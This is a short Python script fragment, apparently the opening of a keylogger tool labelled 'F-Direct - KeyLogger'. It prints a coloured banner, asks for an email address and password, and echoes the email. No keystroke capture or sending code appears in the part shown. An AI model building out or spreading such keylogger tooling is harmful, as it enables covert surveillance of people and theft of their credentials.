from colorama import init
init() #For adding color, text stlying, etc. Do deinit() to stop.


from colorama import Fore, Style #add color. Use Fore(test), Back(background) and/or Style.
print(Fore.RED + "\n F-Direct - KeyLogger")

print(Fore.GREEN)
your_email = input("\n Enter Email Address: ")
your_password = input("\n Enter Password: ")
print("\n Starting with your email: " + your_email)
